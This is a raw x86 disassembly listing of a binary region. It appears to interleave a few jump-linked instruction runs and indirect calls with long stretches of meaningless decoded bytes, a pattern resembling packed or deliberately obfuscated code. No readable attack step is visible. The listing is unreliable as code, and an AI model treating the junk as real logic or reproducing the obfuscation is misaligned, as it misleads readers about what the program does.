  40ffc5:	rol    DWORD PTR [edx-0x5],1
  40ffc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc9:	and    eax,0x4bb02dc4
  40ffce:	push   ds
  40ffcf:	sbb    esi,DWORD PTR [edi-0x3775c9fe]
  40ffd5:	jg     0x410005
  40ffd7:	and    dl,BYTE PTR [esi]
  40ffd9:	std    
  40ffda:	jp     0x40ff8a
  40ffdc:	sub    al,0x8f
  40ffde:	pop    ss
  40ffdf:	ret    0x3163
  40ffe2:	leave  
  40ffe3:	lods   al,BYTE PTR ds:[esi]
  40ffe4:	gs ds pop ebp
  40ffe7:	loope  0x40ff71
  40ffe9:	adc    al,0x1c
  40ffeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffec:	sub    DWORD PTR [ebx-0x14],ebx
  40ffef:	xchg   dh,dl
  40fff1:	xchg   esp,eax
  40fff2:	jns    0x40ffe7
  40fff4:	out    0xef,al
  40fff6:	pop    edi
  40fff7:	dec    ebp
  40fff8:	pop    esp
  40fff9:	inc    esp
  40fffa:	jecxz  0x41002b
  40fffc:	add    dl,BYTE PTR [edi-0x39]
  40ffff:	add    ah,BYTE PTR [esp+ebp*1-0x7f9223a2]
  410006:	mov    esi,0xb095cd69
  41000b:	cmp    edi,ebx
  41000d:	sub    esi,eax
  41000f:	and    DWORD PTR ds:0x433674,0x43359c
  410019:	sub    edx,eax
  41001b:	sbb    DWORD PTR ds:0x433548,0x7577
  410025:	imul   edx,esi
  410028:	mov    esi,DWORD PTR [ebp-0x4]
  41002b:	mov    DWORD PTR ds:0x433640,0x3915
  410035:	cmp    esi,edx
  410037:	mov    DWORD PTR ds:0x433558,0x1945
  410041:	je     0x4109e4
  410047:	mov    DWORD PTR [ebp-0x18],0x4aebda42
  41004e:	xor    esi,0x3634
  410054:	mov    edx,DWORD PTR [ebp-0x18]
  410057:	xor    DWORD PTR ds:0x4335c8,0x3bba
  410061:	jmp    0x41013d
  410066:	loopne 0x410049
  410068:	lahf   
  410069:	xchg   edx,eax
  41006a:	lahf   
  41006b:	(bad)  
  41006c:	in     eax,dx
  41006d:	repz scas al,BYTE PTR es:[edi]
  41006f:	lock aas 
  410071:	int    0xe2
  410073:	push   es
  410074:	loopne 0x410043
  410076:	add    ebp,DWORD PTR [ebp+0xbf0000]
  41007c:	add    BYTE PTR [eax],al
  41007e:	cmc    
  41007f:	adc    eax,DWORD PTR [edx+0x16]
  410082:	or     al,0x89
  410084:	out    dx,eax
  410085:	xchg   BYTE PTR [ebx-0x53],ah
  410088:	jecxz  0x410107
  41008a:	icebp  
  41008b:	jbe    0x410033
  41008d:	gs loopne 0x410046
  410090:	popa   
  410091:	adc    eax,0xdef6f876
  410096:	fbstp  TBYTE PTR [edi-0x19]
  410099:	dec    eax
  41009a:	fmul   QWORD PTR [esi+0x43]
  41009d:	out    0x99,eax
  41009f:	cdq    
  4100a0:	push   ebx
  4100a1:	xchg   ebx,eax
  4100a2:	scas   eax,DWORD PTR es:[edi]
  4100a3:	out    dx,al
  4100a4:	call   0xa0212bb6
  4100a9:	or     BYTE PTR [ebx-0x32],cl
  4100ac:	ret    0x407f
  4100af:	iret   
  4100b0:	fbld   TBYTE PTR [edi-0x615f082e]
  4100b6:	aas    
  4100b7:	lahf   
  4100b8:	sbb    edi,edi
  4100ba:	data16 sbb al,0x36
  4100bd:	lods   eax,DWORD PTR ds:[esi]
  4100be:	mov    BYTE PTR [ebp+0x37],dh
  4100c1:	(bad)  
  4100c2:	pop    ecx
  4100c3:	stos   DWORD PTR es:[edi],eax
  4100c4:	stos   DWORD PTR es:[edi],eax
  4100c5:	into   
  4100c6:	test   DWORD PTR ds:0x99485736,ecx
  4100cc:	out    0x4a,al
  4100ce:	mov    ds:0x4698f98c,al
  4100d3:	jmp    0x723f7011
  4100d8:	sbb    eax,0x3e1503a6
  4100dd:	mov    bh,0x89
  4100df:	in     al,dx
  4100e0:	mov    ebx,0x5e344b90
  4100e5:	xchg   esi,eax
  4100e6:	xor    dh,bh
  4100e8:	and    al,0x80
  4100ea:	popa   
  4100eb:	inc    esp
  4100ec:	aam    0xcb
  4100ee:	jne    0x4100f2
  4100f0:	push   0x6e4000ef
  4100f5:	out    dx,eax
  4100f6:	mov    esp,0xcb1ac72c
  4100fb:	pop    ecx
  4100fc:	ja     0x4100f4
  4100fe:	push   ecx
  4100ff:	add    eax,0xa5d98fd1
  410104:	jg     0x4100c2
  410106:	out    dx,al
  410107:	mov    ecx,DWORD PTR [esi]
  410109:	out    dx,eax
  41010a:	ja     0x4100b1
  41010c:	push   ds
  41010d:	push   0xa62d3f4b
  410112:	inc    eax
  410113:	lods   al,BYTE PTR ds:[esi]
  410114:	cdq    
  410115:	pop    ebp
  410116:	daa    
  410117:	not    DWORD PTR [edi+0x75]
  41011a:	jge    0x410179
  41011c:	push   ecx
  41011d:	hlt    
  41011e:	and    esp,DWORD PTR [esi+0x13]
  410121:	push   ecx
  410122:	adc    BYTE PTR [esi-0x52],bl
  410125:	mov    edx,0xc2c99508
  41012a:	fldcw  WORD PTR [ebx-0x7c56c84d]
  410130:	ret    0x3f1a
  410133:	icebp  
  410134:	pop    eax
  410135:	push   eax
  410136:	add    dl,ah
  410138:	aam    0xc2
  41013a:	sbb    eax,0x758b4a9e
  41013f:	call   0x7552efc5
  410144:	add    BYTE PTR [eax],al
  410146:	sub    edx,0x3cf87511
  41014c:	cmp    DWORD PTR ds:0x4335c8,0x0
  410153:	jge    0x41018a
  410159:	sub    DWORD PTR ds:0x433540,0x724b
  410163:	jmp    0x41018a
  410168:	push   DWORD PTR [ebp-0x28]
  41016b:	push   0x433548
  410170:	push   DWORD PTR [ebp-0x20]
  410173:	push   0x43357c
  410178:	push   DWORD PTR [ebp-0x28]
  41017b:	push   DWORD PTR [ebp-0x20]
  41017e:	push   DWORD PTR [ebp-0x1c]
  410181:	push   DWORD PTR [ebp-0x1c]
  410184:	call   DWORD PTR ds:0x43c80c
  41018a:	shl    esi,0x10
  41018d:	xor    edx,0x78e20000
  410193:	jmp    0x41026f
  410198:	aas    
  410199:	sbb    esi,edi
  41019b:	das    
  41019c:	imul   edi
  41019e:	call   FWORD PTR [ebx]
  4101a0:	xchg   DWORD PTR [edx],ecx
  4101a2:	neg    DWORD PTR [edi+0x7a]
  4101a5:	mov    ch,0x26
  4101a7:	jo     0x41016b
  4101a9:	lods   eax,DWORD PTR ds:[esi]
  4101aa:	add    BYTE PTR [eax],al
  4101ac:	mov    edi,0xbf000000
  4101b1:	fldenv ds:0x1dbbba97
  4101b7:	fcomp  DWORD PTR [ecx+0x5]
  4101ba:	mov    cs,ebx
  4101bc:	push   edi
  4101bd:	mov    al,0x8c
  4101bf:	ins    DWORD PTR es:[edi],dx
  4101c0:	mov    ds:0xf225edac,al
  4101c5:	mov    bl,0xe7
  4101c7:	sbb    al,0xf9
  4101c9:	jp     0x4101a4
  4101cb:	adc    ch,BYTE PTR [ecx]
  4101cd:	dec    edx
  4101ce:	out    0x66,al
  4101d0:	data16 (bad) 
  4101d2:	xchg   esi,eax
  4101d3:	sti    
  4101d4:	shl    BYTE PTR [ebx+ebx*1+0x7c],1
  4101d8:	jle    0x410219
  4101da:	mov    esi,0xd3b89515
  4101df:	outs   dx,BYTE PTR ds:[esi]
  4101e0:	lock xor DWORD PTR [ebx+0x6e],0x9a599fd2
  4101e8:	xchg   esp,eax
  4101e9:	pop    edx
  4101ea:	jns    0x4101da
  4101ec:	pop    es
  4101ed:	lock add eax,edi
  4101f0:	adc    eax,ebx
  4101f2:	aaa    
  4101f3:	push   0x27
  4101f5:	fs hlt 
  4101f7:	or     dh,dl
  4101f9:	or     eax,DWORD PTR [ebp+0x1b]
  4101fc:	nop
  4101fd:	jbe    0x410239
  4101ff:	xor    eax,0x57896d98
  410204:	ret    0x7a0a
  410207:	push   0xffffffef
  410209:	push   ebp
  41020a:	ret    
  41020b:	jbe    0x410212
  41020d:	inc    ecx
  41020e:	and    ebx,DWORD PTR [edi-0x4d]
  410211:	mov    al,ds:0x3bdda912
  410216:	add    ch,BYTE PTR [edi+0x70]
  410219:	arpl   dx,si
  41021b:	sbb    ah,bl
  41021d:	aad    0x38
  41021f:	fldcw  WORD PTR [ecx-0x7f]
  410222:	adc    al,0x8b
  410224:	mov    al,0x10
  410226:	test   eax,0xb04c86b7
  41022b:	xor    ecx,DWORD PTR [esi+ebp*8-0x29]
  41022f:	pop    DWORD PTR [edi-0x32883568]
  410235:	xor    eax,0x2e6bb076
  41023a:	push   cs
  41023b:	pop    ecx
  41023c:	xor    esi,DWORD PTR [edx-0x3cc053ac]
  410242:	imul   ecx,DWORD PTR [ebp-0x40],0x18
  410246:	and    eax,DWORD PTR [ecx]
  410248:	push   esi
  410249:	xor    ecx,ebx
  41024b:	jb     0x41025b
  41024d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41024e:	in     eax,0x9c
  410250:	jns    0x4102bd
  410252:	adc    bl,BYTE PTR [ebp+0x34fa1299]
  410258:	pop    ss
  410259:	sbb    eax,DWORD PTR [ebx-0xa1561de]
  41025f:	push   ebp
  410260:	out    dx,eax
  410261:	jae    0x410277
  410263:	add    edx,DWORD PTR [esp+edi*1]
  410266:	imul   ecx,DWORD PTR [eax+0x3e],0x7c4d650
  41026d:	or     ebp,eax
  41026f:	shr    edx,0x10
  410272:	xor    esi,0x59c90000
  410278:	or     esi,edx
  41027a:	lea    edx,[esi*8+0x183c57f0]
  410281:	sbb    esi,DWORD PTR ds:0x433624
  410287:	mov    esi,DWORD PTR [ebp-0x4]
  41028a:	cmp    DWORD PTR ds:0x43357c,0x0
  410291:	jbe    0x4102be
  410297:	jmp    0x4102be
  41029c:	push   0x5e80
  4102a1:	push   0x433574
  4102a6:	push   0x42ed20
  4102ab:	push   DWORD PTR [ebp-0xc]
  4102ae:	push   0x39a0
  4102b3:	push   0x1924
  4102b8:	call   DWORD PTR ds:0x43c810
  4102be:	mov    edx,DWORD PTR [esi+edx*1]
  4102c1:	jmp    0x41039d
  4102c6:	adc    al,0x2e
  4102c8:	(bad)  
  4102ca:	sti    
  4102cb:	call   DWORD PTR [esi]
  4102cd:	out    dx,eax
  4102ce:	out    dx,eax
  4102cf:	adc    ah,dl
  4102d1:	in     al,0x3a
  4102d3:	mov    ebx,DWORD PTR [esi+0xae8133]
  4102d9:	add    BYTE PTR [edi-0x2000000],bh
  4102df:	push   eax
  4102e0:	stos   BYTE PTR es:[edi],al
  4102e1:	and    BYTE PTR [edx+eiz*4-0x49],al
  4102e5:	dec    eax
  4102e6:	pusha  
  4102e7:	daa    
  4102e8:	and    al,0xd5
  4102ea:	jb     0x410271
  4102ec:	xor    al,0xa4
  4102ee:	jl     0x410291
  4102f0:	arpl   ax,dx
  4102f2:	mov    bl,0x90
  4102f4:	rcr    BYTE PTR [edx],cl
  4102f6:	jo     0x410311
  4102f8:	sbb    eax,0xdcb62c8e
  4102fd:	outs   dx,DWORD PTR ds:[esi]
  4102fe:	cdq    
  4102ff:	cmp    dl,0x18
  410302:	leave  
  410303:	mov    dh,0x44
  410305:	dec    esi
  410306:	jge    0x41034a
  410308:	inc    ebp
  410309:	pop    es
  41030a:	lds    ecx,FWORD PTR [esi]
  41030c:	popf   
  41030d:	ins    BYTE PTR es:[edi],dx
  41030e:	push   ebx
  41030f:	stos   DWORD PTR es:[edi],eax
  410310:	cmc    
  410311:	or     al,0x95
  410313:	mov    DWORD PTR [edi],ebp
  410315:	jbe    0x4102b0
  410317:	mov    ecx,DWORD PTR [edi*2+0x6b5a48ed]
  41031e:	inc    ecx
  41031f:	jge    0x4102e1
  410321:	nop
  410322:	pop    eax
  410323:	or     al,0xa4
  410325:	pop    ecx
  410326:	xchg   esi,eax
  410327:	mov    DWORD PTR [ebp+0xabd825f],esp
  41032d:	adc    DWORD PTR [esi],ebx
  41032f:	pop    edi
  410330:	sbb    eax,0x9abc46a2
  410335:	in     al,dx
  410336:	or     al,0x5b
  410338:	adc    DWORD PTR [eax+0x69],esp
  41033b:	and    BYTE PTR [edi+edi*4+0x14],al
  41033f:	call   0x587:0x22e12a63
  410346:	cli    
  410347:	push   ecx
  410348:	cli    
  410349:	into   
  41034a:	mov    ch,0xd2
  41034c:	sbb    BYTE PTR [ebx+0x50],dl
  41034f:	cmp    ecx,esp
  410351:	inc    edi
  410352:	outs   dx,DWORD PTR ds:[esi]
  410353:	cmc    
  410354:	popa   
  410355:	jns    0x410339
  410357:	test   BYTE PTR [esp+eax*4-0x2329c84c],al
  41035e:	in     al,0x41
  410360:	pop    ebx
  410361:	hlt    
  410362:	jno    0x410313
  410364:	shl    DWORD PTR [ebp+0x41],0x5c
  410368:	jl     0x410369
  41036a:	ret    0x172d
  41036d:	neg    DWORD PTR [edx]
  41036f:	and    eax,0xc7d75b2c
  410374:	push   edi
  410375:	mov    dh,0x19
  410377:	pushf  
  410378:	rol    BYTE PTR [edx],1
  41037a:	repnz or BYTE PTR [ecx+0x2a],0x63
  41037f:	jmp    0x4103d8
  410381:	inc    ebx
  410382:	mov    dh,0x7
  410384:	inc    ebp
  410385:	dec    ebp
  410386:	mov    eax,0x94d53d4b
  41038b:	push   0x1039b33a
  410390:	stos   DWORD PTR es:[edi],eax
  410391:	lds    edi,FWORD PTR [ecx]
  410393:	mov    dh,0x8a
  410395:	pop    ecx
  410396:	add    DWORD PTR [eax+0x664ceb9b],eax
  41039c:	xchg   ebp,eax
  41039d:	mov    DWORD PTR [ebp-0x4],edx
  4103a0:	mov    edx,DWORD PTR [ebp-0x38]
  4103a3:	jmp    0x41047f
  4103a8:	ds jge 0x410385
  4103ab:	neg    bl
  4103ad:	idiv   DWORD PTR [esi]
  4103af:	std    
  4103b0:	push   ebx
  4103b1:	popa   
  4103b2:	nop
  4103b3:	pop    edi
  4103b4:	jo     0x41042a
  4103b6:	fstp   DWORD PTR [edi+0x40]
  4103b9:	scas   eax,DWORD PTR es:[edi]
  4103ba:	add    BYTE PTR [eax],al
  4103bc:	mov    edi,0xc6000000
  4103c1:	popa   
  4103c2:	mov    WORD PTR [edi+0x55b8cd7],ss
  4103c8:	adc    DWORD PTR [ebp+0x4a],ecx
  4103cb:	mov    DWORD PTR [edx+esi*4-0x54],eax
  4103cf:	shl    DWORD PTR [edx-0x14],0x5
  4103d3:	dec    edx
  4103d4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4103d6:	adc    DWORD PTR [edi-0x61],ebp
  4103d9:	add    ebx,DWORD PTR [ecx+0x5e]
  4103dc:	mov    bl,0xfc
  4103de:	sub    DWORD PTR [eax-0x5439549e],ebx
  4103e4:	xchg   ebx,eax
  4103e5:	in     al,dx
  4103e6:	jmp    0x4103c9
  4103e8:	adc    BYTE PTR [ebx],al
  4103ea:	popf   
  4103eb:	push   esi
  4103ec:	mov    ds:0xfaaf7451,al
  4103f1:	call   0x483f:0xd5008ea7
  4103f8:	jne    0x4103dc
  4103fa:	outs   dx,BYTE PTR ds:[esi]
  4103fb:	cs xor al,0x29
  4103fe:	sub    BYTE PTR [ebx],dh
  410400:	add    BYTE PTR [ecx+ebp*1],ah
  410403:	xchg   edx,eax
  410404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410405:	xchg   edx,eax
  410406:	push   ss
  410407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410408:	pop    edx
  410409:	rcl    DWORD PTR [edx-0x3b216338],1
  41040f:	pop    esi
  410410:	pop    ebp
  410411:	fwait
  410412:	push   ss
  410413:	push   0x32
  410415:	in     eax,dx
  410416:	sbb    edi,DWORD PTR [eax-0x1d]
  410419:	inc    ebx
  41041a:	sub    DWORD PTR [edx+0x75],eax
  41041d:	pop    edi
  41041e:	jne    0x410493
  410420:	(bad)  
  410421:	xor    ecx,DWORD PTR [esi]
  410423:	add    al,0x8b
  410425:	jmp    0x9ff7:0xf1b9de7c
  41042c:	push   edx
  41042d:	setnp  dl
  410430:	and    ebp,0xd50efccd
  410436:	cli    
  410437:	cs call 0x4110:0x7b5cf943
  41043f:	sbb    ah,BYTE PTR [eax]
  410441:	mov    ah,bh
  410443:	call   0xa50d55be
  410448:	das    
  410449:	mov    ecx,0x100a0832
  41044e:	aaa    
  41044f:	sti    
  410450:	adc    ah,dh
  410452:	sar    BYTE PTR [esi-0x3689578b],0x73
  410459:	nop
  41045a:	ret    
  41045b:	daa    
  41045c:	xchg   ecx,eax
  41045d:	cs in  al,dx
  41045f:	hlt    
  410460:	sar    DWORD PTR [esi],0x7b
  410463:	push   cs
  410464:	dec    eax
  410465:	test   eax,0xf21a35fe
  41046a:	je     0x4104a7
  41046c:	outs   dx,BYTE PTR ds:[esi]
  41046d:	scas   eax,DWORD PTR es:[edi]
  41046e:	jb     0x41040f
  410470:	and    bl,dh
  410472:	(bad)  
  410473:	data16 (bad) 
  410475:	dec    esp
  410476:	lock sbb esi,edx
  410479:	mov    edi,0xb87c6f03
  41047e:	cmc    
  41047f:	mov    esi,DWORD PTR [ebp-0x34]
  410482:	mov    esi,DWORD PTR [ebp-0x30]
  410485:	mov    edi,DWORD PTR [ebp-0x2c]
  410488:	xor    edx,ecx
  41048a:	jmp    0x410566
  41048f:	add    eax,0xfedba873
  410494:	(bad)  [edi-0x1]
  410497:	scas   al,BYTE PTR es:[edi]
  410498:	in     eax,dx
  410499:	leave  
  41049a:	(bad)  
  41049b:	shl    BYTE PTR [ecx],1
  41049d:	or     esi,DWORD PTR [eax-0x1]
  4104a0:	scas   eax,DWORD PTR es:[edi]
  4104a1:	add    BYTE PTR [eax],al
  4104a3:	mov    edi,0x3f000000
  4104a8:	cdq    
  4104a9:	inc    edi
  4104aa:	es inc edi
  4104ac:	pop    esi
  4104ad:	sub    BYTE PTR es:[edx],bl
  4104b0:	dec    edx
  4104b1:	sub    eax,0xa0d21a2e
  4104b6:	ficom  DWORD PTR [eax+0x17]
  4104b9:	mov    edi,0x25e1fcfe
  4104be:	or     dh,al
  4104c0:	sahf   
  4104c1:	and    eax,0xd236afd5
  4104c6:	jo     0x4104b5
  4104c8:	imul   edi,DWORD PTR [edi],0xc0d8c660
  4104ce:	sbb    al,0xe
  4104d0:	fs mov edx,0x8d59b090
  4104d6:	xor    eax,ecx
  4104d8:	mov    ch,BYTE PTR [eax-0x3e727c33]
  4104de:	sub    esp,ebp
  4104e0:	imul   esi,DWORD PTR [eax+0x213fa3d1],0x609904ab
  4104ea:	aas    
  4104eb:	and    eax,0xfdc2b1d9
  4104f0:	mov    ebp,0x8732b47d
  4104f5:	test   eax,0x96358d2a
  4104fa:	ja     0x41053f
  4104fc:	clc    
  4104fd:	(bad)  
  4104fe:	jmp    0x46fd:0xe4fec49b
  410505:	sbb    dl,BYTE PTR [ebx+0x2a]
  410508:	std    
  410509:	cmp    eax,0xb65e8b11
  41050e:	sbb    ch,BYTE PTR [esi]
  410510:	or     eax,0xecce2749
  410515:	or     al,0x8c
  410517:	xor    BYTE PTR [edx-0x1a],ch
  41051a:	pushf  
  41051b:	fisub  DWORD PTR [esi]
  41051d:	div    DWORD PTR [ebp+0x7e57e5ee]
  410523:	mov    ebp,eax
  410525:	out    dx,eax
  410526:	jge    0x410548
  410528:	hlt    
  410529:	mov    WORD PTR [ebx],fs
  41052b:	jp     0x4104f9
  41052d:	fild   QWORD PTR [edi+0x79]
  410530:	sub    ebp,DWORD PTR [ecx+0x171fa677]
  410536:	mov    al,0x59
  410538:	arpl   WORD PTR [ebx],di
  41053a:	jmp    0x5583:0x677f7989
  410541:	adc    eax,0x17586e1a
  410546:	inc    ecx
  410547:	int3   
  410548:	jmp    0x641c:0xd613dcec
  41054f:	xor    ebx,DWORD PTR [eax]
  410551:	ror    DWORD PTR [eax+0x47],0x98
  410555:	dec    edx
  410556:	pop    ss
  410557:	lds    eax,FWORD PTR [ebp-0x6353ad]
  41055d:	or     eax,0xf8b70741
  410562:	(bad)  
  410563:	js     0x4105a8
  410565:	mov    dl,0x33
  410567:	icebp  
  410568:	sub    esi,eax
  41056a:	sub    edx,eax
  41056c:	imul   edx,esi
  41056f:	jmp    0x41064b
  410574:	not    BYTE PTR [ecx+0x4d]
  410577:	sahf   
  410578:	out    dx,eax
  410579:	sahf   
  41057a:	idiv   DWORD PTR [ecx-0x19]
  41057d:	inc    ebp
  41057e:	adc    DWORD PTR [ebp+0x4e],ebp
  410581:	call   0xb0ff72aa
  410586:	add    BYTE PTR [eax],al
  410588:	mov    edi,0x3f000000
  41058d:	cld    
  41058e:	inc    ebx
  41058f:	test   al,0xb2
  410591:	mov    al,0x90
  410593:	dec    BYTE PTR [edi-0x1f]
  410596:	jb     0x41058d
  410598:	leave  
  410599:	in     al,dx
  41059a:	and    al,0x89
  41059c:	jbe    0x4105e8
  41059e:	push   0xf2097975
  4105a3:	fld    DWORD PTR [edi]
  4105a6:	cmp    al,0xb1
  4105a8:	or     DWORD PTR [eax-0x3b],ecx
  4105ab:	popf   
  4105ac:	mov    al,ds:0xe8cc724a
  4105b1:	add    ebp,edx
  4105b3:	les    esp,FWORD PTR [ebp-0x2c]
  4105b6:	jl     0x410567
  4105b8:	shr    DWORD PTR [esi+esi*1+0x7],0x99
  4105bd:	jp     0x4105ed
  4105bf:	rcr    BYTE PTR [ecx],cl
  4105c1:	dec    ebp
  4105c2:	xchg   ecx,eax
  4105c3:	xor    al,0x2b
  4105c5:	mov    edx,0x2e243f84
  4105ca:	icebp  
  4105cb:	fs test al,0xd1
  4105ce:	xchg   ebx,eax
  4105cf:	dec    ebx
  4105d0:	xchg   dl,bh
  4105d2:	inc    eax
  4105d3:	mov    ecx,0x5f246cb0
  4105d8:	mov    ss,eax
  4105da:	sbb    BYTE PTR [edx-0x36],cl
  4105dd:	pusha  
  4105de:	mov    eax,gs
  4105e0:	jmp    0x87f1:0x1e9fe03f
  4105e7:	pushf  
  4105e8:	push   edi
  4105e9:	fstp   DWORD PTR [ebp-0x613944dc]
  4105ef:	cli    
  4105f0:	shl    BYTE PTR [edx-0x52af9881],0xb5
  4105f7:	fld    TBYTE PTR [edx+ecx*1-0x29]
  4105fb:	dec    esi
  4105fc:	xor    bl,BYTE PTR [esi+ebp*8]
  4105ff:	pushf  
  410600:	lea    ecx,[ecx]
  410602:	push   cs
  410603:	push   edi
  410604:	sub    DWORD PTR [esi],esi
  410606:	iret   
  410607:	xchg   edx,eax
  410608:	or     BYTE PTR [eax+edi*2],bl
  41060b:	adc    bh,cl
  41060d:	sbb    ax,WORD PTR [ebx+0x2d8e1f32]
  410614:	lock (bad) 
  410616:	sub    ebp,ebx
  410618:	(bad)  
  410619:	xchg   ebx,eax
  41061a:	pop    edi
  41061b:	mov    edi,0xa5cc053b
  410620:	pusha  
  410621:	fisub  WORD PTR [edi+0x51]
  410624:	jg     0x410634
  410626:	inc    ebp
  410627:	sub    eax,0x360f7588
  41062c:	mov    ah,0xbd
  41062e:	test   eax,0xf42f3cb1
  410633:	push   ecx
  410634:	jecxz  0x4106a9
  410636:	mov    ?,esp
  410638:	sbb    DWORD PTR ds:[ebx-0x77],edi
  41063c:	pop    edx
  41063d:	lods   al,BYTE PTR ds:[esi]
  41063e:	mov    eax,0x87802d97
  410643:	jno    0x41067c
  410645:	ror    bh,0x71
  410648:	or     ch,ch
  41064a:	jp     0x4105d7
  41064c:	jne    0x41064a
  41064e:	cmp    esi,edx
  410650:	je     0x4109e4
  410656:	jmp    0x410732
  41065b:	dec    edi
  41065c:	mov    ecx,0xfeffec6f
  410661:	iret   
  410662:	mov    ebx,0x6de43ef6
  410667:	or     al,0x7
  410669:	mov    ah,0xa1
  41066b:	jge    0x41061e
  41066d:	add    BYTE PTR [eax],al
  41066f:	mov    edi,0x7d000000
  410674:	leave  
  410675:	or     ebp,DWORD PTR [edi+0x49833d7d]
  41067b:	inc    ebx
  41067c:	adc    dh,BYTE PTR [ecx+0x2f]
  41067f:	ss rcr ch,cl
  410682:	xor    al,0x30
  410684:	sti    
  410685:	mov    bh,0xc5
  410687:	rcpps  xmm0,XMMWORD PTR [eax+0x6f]
  41068b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41068c:	stos   DWORD PTR es:[edi],eax
  41068d:	popa   
  41068e:	dec    edx
  41068f:	cwde   
  410690:	xchg   dl,ch
  410692:	ja     0x41066f
  410694:	mov    dh,ch
  410696:	sbb    BYTE PTR [ebp+0x26],dh
  410699:	dec    ebx
  41069a:	and    BYTE PTR [eax],ah
  41069c:	inc    ebp
  41069d:	pop    ebp
  41069e:	loope  0x410623
  4106a0:	out    dx,eax
  4106a1:	xchg   esp,eax
  4106a2:	sti    
  4106a3:	rcl    ch,1
  4106a5:	and    ch,BYTE PTR [ebp+0x5cf13803]
  4106ab:	int    0x6c
  4106ad:	pop    ds
  4106ae:	sub    ah,BYTE PTR [esi-0x42797075]
  4106b4:	xor    al,0x7f
  4106b6:	ret    0x608c
  4106b9:	int    0xe5
  4106bb:	push   esp
  4106bc:	div    BYTE PTR [esi]
  4106be:	xor    cl,ah
  4106c0:	out    dx,eax
  4106c1:	push   0x7b
  4106c3:	out    dx,al
  4106c4:	xchg   esi,eax
  4106c5:	pop    ds
  4106c6:	lods   al,BYTE PTR ds:[esi]
  4106c7:	and    BYTE PTR [edi+esi*4],cl
  4106ca:	xor    dl,BYTE PTR [edx]
  4106cc:	jo     0x410663
  4106ce:	push   0x15
  4106d0:	arpl   WORD PTR [ebp+0x2af0c2f5],bp
  4106d6:	xchg   esi,eax
  4106d7:	nop
  4106d8:	rol    DWORD PTR [edx+ebx*4],0x4e
  4106dc:	lea    ecx,[ebx-0x3ab51793]
  4106e2:	push   DWORD PTR [esp+ecx*4-0x6f]
  4106e6:	loopne 0x410738
  4106e8:	nop
  4106e9:	outs   dx,DWORD PTR ds:[esi]
  4106ea:	xor    al,0xc6
  4106ec:	adc    eax,0x4f6bbe2b
  4106f1:	icebp  
  4106f2:	aam    0x9f
  4106f4:	sti    
  4106f5:	dec    esi
  4106f6:	test   al,0xf4
  4106f8:	inc    edx
  4106f9:	call   0xb7e08876
  4106fe:	pop    ecx
  4106ff:	in     al,0x6
  410701:	fcmove st,st(2)
  410703:	(bad)  
  410704:	jbe    0x410709
  410706:	test   ecx,edx
  410708:	cmc    
  410709:	mov    ebx,0x699e0668
  41070e:	ss push edx
  410710:	or     eax,esp
  410712:	shl    DWORD PTR [esp+edx*4-0x5ece092d],0xfe
  41071a:	pop    ds
  41071b:	daa    
  41071c:	leave  
  41071d:	aaa    
  41071e:	inc    edi
  41071f:	xchg   ebp,eax
  410720:	sbb    eax,0x446cb49d
  410725:	mov    WORD PTR [ebx],es
  410727:	out    dx,al
  410728:	test   cl,dl
  41072a:	mov    bh,0x91
  41072c:	mov    dh,0x2b
  41072e:	test   eax,0x8b760015
  410733:	push   ebp
  410734:	enter  0x758b,0xcc
  410738:	jmp    0x410814
  41073d:	inc    edi
  41073e:	int    0x29
  410740:	sbb    al,0xab
  410742:	cld    
  410743:	ja     0x410724
  410745:	stos   BYTE PTR es:[edi],al
  410746:	sti    
  410747:	dec    edi
  410748:	cmp    bl,bl
  41074a:	xchg   esi,eax
  41074b:	ret    
  41074c:	jo     0x41078a
  41074e:	mov    dl,0x0
  410750:	add    BYTE PTR [edi+0x3000000],bh
  410756:	out    0x1b,eax
  410758:	repnz test cl,bl
  41075b:	jae    0x410786
  41075d:	nop    DWORD PTR [edi+ecx*8+0x8]
  410762:	inc    esp
  410763:	popf   
  410764:	stos   DWORD PTR es:[edi],eax
  410765:	inc    ecx
  410766:	push   0xffffffd6
  410768:	xchg   edi,eax
  410769:	out    dx,eax
  41076a:	sbb    BYTE PTR [ebx+0x5e],ch
  41076d:	cs lahf 
  41076f:	xor    bl,dh
  410771:	add    al,0x9b
  410773:	mov    dh,0xfe
  410775:	mov    ch,0x4b
  410777:	sbb    esi,edx
  410779:	(bad)  
  41077a:	mov    bl,0x5
  41077c:	push   edi
  41077d:	ret    
  41077e:	add    al,0x2b
  410780:	xchg   ebx,eax
  410781:	outs   dx,BYTE PTR ds:[esi]
  410782:	mov    WORD PTR [ebx+0x1a],gs
  410785:	push   esp
  410786:	jb     0x55b45660
  41078c:	pop    ebx
  41078d:	imul   edx,DWORD PTR [edx+0x25b9ef43],0xffffffcf
  410794:	push   ss
  410795:	sahf   
  410796:	mov    esp,0xbca7aa37
  41079b:	cmp    esi,esp
  41079d:	or     ch,ch
  41079f:	aam    0x34
  4107a1:	mov    dl,0x1b
  4107a3:	cs enter 0xf99b,0x2f
  4107a8:	xor    al,0x86
  4107aa:	mov    dh,BYTE PTR [esi*8-0x66642480]
  4107b1:	lods   al,BYTE PTR ds:[esi]
  4107b2:	xchg   esi,eax
  4107b3:	dec    edi
  4107b4:	std    
  4107b5:	lods   eax,DWORD PTR ds:[esi]
  4107b6:	xchg   edx,eax
  4107b7:	pop    ss
  4107b8:	pop    esp
  4107b9:	inc    edx
  4107ba:	test   dh,dh
  4107bc:	test   DWORD PTR [ebx-0x29],0x6d5e20a4
  4107c3:	ss test al,0xbf
  4107c6:	jmp    0xb1b1:0x7a84a79
  4107cd:	sbb    eax,0xfebe430e
  4107d2:	lock pushf 
  4107d4:	xchg   esp,eax
  4107d5:	repnz inc ebp
  4107d7:	loope  0x410823
  4107d9:	loopne 0x41084d
  4107db:	jno    0x41080e
  4107dd:	xchg   esi,eax
  4107de:	jnp    0x410800
  4107e0:	pop    es
  4107e1:	pop    edi
  4107e2:	xchg   BYTE PTR [ebp-0x11],ah
  4107e5:	cmp    cl,BYTE PTR [edx]
  4107e7:	sub    eax,0xa405f66f
  4107ec:	fnstcw WORD PTR [edx]
  4107ee:	cs sar ebp,cl
  4107f1:	cmp    eax,0xcb5ba303
